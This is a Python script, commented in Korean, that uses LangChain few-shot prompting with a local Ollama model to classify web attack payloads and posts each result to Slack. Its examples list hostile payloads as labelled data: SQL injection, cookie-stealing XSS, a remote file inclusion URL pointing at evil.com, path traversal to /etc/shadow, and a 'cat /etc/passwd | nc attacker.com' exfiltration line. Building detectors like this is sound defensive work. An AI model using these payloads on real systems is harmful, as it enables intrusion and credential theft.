from langchain_core.prompts import (
    PromptTemplate,
    FewShotPromptTemplate,
)
# ChatOpenAI는 임포트만 하고 Ollama를 사용합니다.
from langchain_openai import ChatOpenAI 
from langchain_core.output_parsers import StrOutputParser
from langchain_ollama import ChatOllama

import ollama
import os
from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError
from dotenv import load_dotenv
# .env 파일에서 환경 변수를 로드합니다.
load_dotenv()

# --- 1. '예제(Examples)' 데이터 정의 ---
# 모델에게 학습시킬 "공격 패턴"과 "유형"의 쌍입니다.
# 'Normal' 유형을 추가하여 정상적인 입력도 구분하도록 합니다.
examples = [
    {
        "input": "' OR '1'='1' --",
        "attack_type": "SQL Injection"
    },
    {
        "input": "<script>alert('XSS')</script>",
        "attack_type": "PHP/HTML Injection (XSS)"
    },
    {
        "input": "index.php?page=http://evil.com/shell.php",
        "attack_type": "Remote File Inclusion (RFI)"
    },
    {
        "input": "8.8.8.8; ls -la /",
        "attack_type": "Command Injection"
    },
    {
        "input": "안녕하세요, 로그인하고 싶습니다.",
        "attack_type": "Normal"
    },
    {
        "input": "UNION SELECT user, password FROM users",
        "attack_type": "SQL Injection"
    },
    {
        "input": "<img src=x onerror=alert(document.cookie)>",
        "attack_type": "PHP/HTML Injection (XSS)"
    },
    {
        "input": "cat /etc/passwd | nc attacker.com 80",
        "attack_type": "Command Injection"
    }
]

# --- 2. '예제 형식(Format)' 정의 ---
# 위 'examples'의 각 항목을 어떤 "일관된 형식"으로 보여줄지 정의합니다.
example_prompt = PromptTemplate(
    input_variables=["input", "attack_type"], # examples의 key와 일치
    template="입력된 페이로드: {input}\n분류된 공격 유형: {attack_type}\n---" # 예시 하나하나의 형식
)

# --- 3. 'FewShotPromptTemplate' 조립 ---
few_shot_prompt = FewShotPromptTemplate(
    # ① "예제들을 결합"하는 부분
    examples=examples,                # 사용할 예시 데이터
    example_prompt=example_prompt,    # 예시를 포맷할 템플릿
    
    # 예시 목록이 시작되기 전, LLM에게 주는 전체 지시사항
    prefix="다음은 사용자 입력을 보고 웹 공격 유형을 분류하는 예시입니다. 'SQL Injection', 'PHP/HTML Injection (XSS)', 'Command Injection', 'Remote File Inclusion (RFI)', 'Normal' 중 하나로 정확히 분류해주세요.",
    
    # ② "새로운 입력을 추가"하는 부분 (모델이 실제로 풀어야 할 문제)
    suffix="입력된 페이로드: {user_input}\n분류된 공격 유형:", # 모델이 '분류된 공격 유형:' 뒤를 채우도록 유도
    
    input_variables=["user_input"]    # 사용자가 최종적으로 입력할 변수
)

# 4. LLM 체인 구성 및 실행
llm = ChatOllama(
    base_url="http://localhost:11434",
    model="gemma3:12b" 
                      
)
chain = few_shot_prompt | llm | StrOutputParser()

# --- (참고) 최종 프롬프트가 어떻게 생겼는지 확인하기 ---
# final_prompt = few_shot_prompt.format(user_input="<body onload=alert('hi')>")
# print(final_prompt)
# ----------------------------------------------------


# --- 체인 실행 ---
# 테스트할 입력값
# new_input = "<body onload=alert('hi')>"  # PHP/HTML Injection (XSS)
# new_input = "SELECT * FROM products" # Normal
new_input = "file=../../../../etc/shadow" # Command Injection (Path Traversal) 또는 Normal (모델에 따라 다름)
# new_input = "1' AND 1=(SELECT COUNT(*) FROM tablenames); --" # SQL Injection

result = chain.invoke({"user_input": new_input})

print(f"입력: {new_input}")
print(f"결과: {result.strip()}") # strip()으로 앞뒤 공백 제거


slack_token = os.getenv("SLACK_BOT_TOKEN")
if not slack_token:
    print("오류: .env 파일에 SLACK_BOT_TOKEN이 설정되지 않았습니다.")
    exit(1)
# WebClient 인스턴스 생성
client = WebClient(token=slack_token)
# 2. 메시지를 보낼 채널 ID 또는 채널 이름을 입력합니다.
channel_name = "C09K283SWLW" # 예: "#general", "#random" 등
# 3. 보낼 메시지 내용을 입력합니다.
message_text = "안녕하세요! Slack API를 통해 보내는 테스트 메시지입니다. [by 이세희]"
combined_message = f"{message_text}\n모델 결과: {result.strip()}"
try:
# chat_postMessage API 호출
    response = client.chat_postMessage(
    channel=channel_name,
    text=combined_message
    
    )
    print("메시지가 성공적으로 전송되었습니다.")
except SlackApiError as e:
# API 호출 실패 시 에러 코드를 확인합니다.
# 에러 원인: 토큰이 유효하지 않거나, 봇이 채널에 없거나, 권한이 부족한 경우 등
    print(f"메시지 전송에 실패했습니다: {e.response['error']}")